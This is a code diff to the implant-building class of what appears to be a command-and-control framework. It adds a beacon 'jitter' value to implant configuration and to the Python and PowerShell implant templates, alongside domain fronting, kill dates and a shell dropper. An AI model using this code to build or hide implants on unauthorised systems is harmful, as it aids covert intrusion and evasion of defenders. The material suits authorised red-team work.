@@ -2,7 +2,7 @@
 
 from Colours import Colours
 from Utils import randomuri, gen_key  
-from Config import PayloadsDirectory, FilesDirectory
+from Config import PayloadsDirectory, FilesDirectory, Jitter
 from DB import select_item, get_defaultbeacon, get_killdate, get_dfheader, get_otherbeaconurls, get_defaultuseragent, new_implant, new_task, update_mods, get_autoruns
 from Core import get_images
 
@@ -28,6 +28,7 @@ class Implant(object):
     self.UserAgent = get_defaultuseragent()
     self.Sleep = get_defaultbeacon()
     self.ModsLoaded = ""
+    self.Jitter = Jitter
     self.ImplantID = ""
     self.Pivot = pivot
     self.KillDate = get_killdate()
@@ -39,16 +40,17 @@ RANDOMURI19901%s10991IRUMODNAR
 URLS10484390243%s34209348401SLRU
 KILLDATE1665%s5661ETADLLIK
 SLEEP98001%s10089PEELS
+JITTER2025%s5202RETTIJ
 NEWKEY8839394%s4939388YEKWEN
-IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDate, self.Sleep, self.Key, self.AllBeaconImages)
+IMGS19459394%s49395491SGMI""" % (self.RandomURI, self.AllBeaconURLs, self.KillDate, self.Sleep, self.Jitter, self.Key, self.AllBeaconImages)
     with open("%spy_dropper.sh" % (PayloadsDirectory), 'rb') as f:
         self.PythonImplant = base64.b64encode(f.read())
     py_implant_core = open("%s/Implant-Core.py" % FilesDirectory, 'r').read()
-    self.PythonCore = py_implant_core % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Key, self.RandomURI, self.UserAgent)
+    self.PythonCore = py_implant_core % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.PythonImplant, self.Jitter, self.Key, self.RandomURI, self.UserAgent)
     ps_implant_core = open("%s/Implant-Core.ps1" % FilesDirectory, 'r').read()
-    self.PSCore = ps_implant_core % (self.Key, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs)
-#Add all db elements
+    self.PSCore = ps_implant_core % (self.Key, self.Jitter, self.Sleep, self.AllBeaconImages, self.RandomURI, self.RandomURI, self.KillDate, self.AllBeaconURLs) #Add all db elements def display(self):
 
+  #Add all db elements
   def display(self):
     print Colours.GREEN,""
     it = self.Pivot
